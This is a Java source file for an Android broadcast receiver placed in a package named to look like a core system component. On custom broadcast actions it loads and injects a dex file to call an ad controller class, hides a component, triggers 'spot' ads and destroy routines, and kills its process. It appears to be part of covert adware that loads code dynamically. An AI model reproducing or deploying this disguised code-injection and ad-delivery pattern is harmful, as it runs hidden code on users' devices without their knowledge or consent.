package com.android.system.core.sometools;




import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class GReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {		
		String action = intent.getAction();
		if(action == null)
			return;
		Log.e("-----------------","lib action="+action);
		if(action.equals("com.xugu.start"))
		{
			Context con = GAdController.getInstance().getContext();
			String dexPath = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_DEX_NAME, "");
			dexPath = GDexLoaderUtil.getDexPath(con, dexPath);
			final String optimizedDexOutputPath = GDexLoaderUtil.getOptimizedDexPath(con);
	        GDexLoaderUtil.inject(dexPath, optimizedDexOutputPath, null, "com.qinglu.ad.QLAdController");
	        GDexLoaderUtil.call(con.getClassLoader(),con);
//			GDexLoaderUtil.loadAndCall(con, dexPath);
		}
		else if(action.equals("com.xugu.killpro"))
		{
			 android.os.Process.killProcess(android.os.Process.myPid());	
		}
		else if(action.equals("com.xugu.behind.hide"))
		{
			GProBehind.getInstance().hide();
		}
		else if(action.equals("android.intent.action.core.restart"))
		{
			Context con = GAdController.getInstance().getContext();
			GAdController.getInstance().init(con);
			GTool.saveSharedData("restart",true);
		}
		else if(action.equals("com.xugu.showspotad"))
		{
			String ac = GTool.getSharedPreferences(context).getString(GCommons.SHARED_KEY_ACTION_TAG, "");
			if("com.xugu.showspotad".equals(ac))
			{
				GTool.saveSharedData(GCommons.SHARED_KEY_ACTION_TAG, "");
				GTool.callSpot(GAdController.getInstance().getContext().getClassLoader(),
						GAdController.getInstance().getContext());
			}					
		}
		else if(action.equals("com.xugu.destory"))
		{
			String ac = GTool.getSharedPreferences(context).getString(GCommons.SHARED_KEY_ACTION_TAG, "");
			if("com.xugu.destory".equals(ac))
			{
				GTool.saveSharedData(GCommons.SHARED_KEY_ACTION_TAG, "");
				String clazName = intent.getStringExtra("clazName");
				GTool.callDestory(GAdController.getInstance().getContext().getClassLoader(),clazName);
			}
			
		}
	}

}
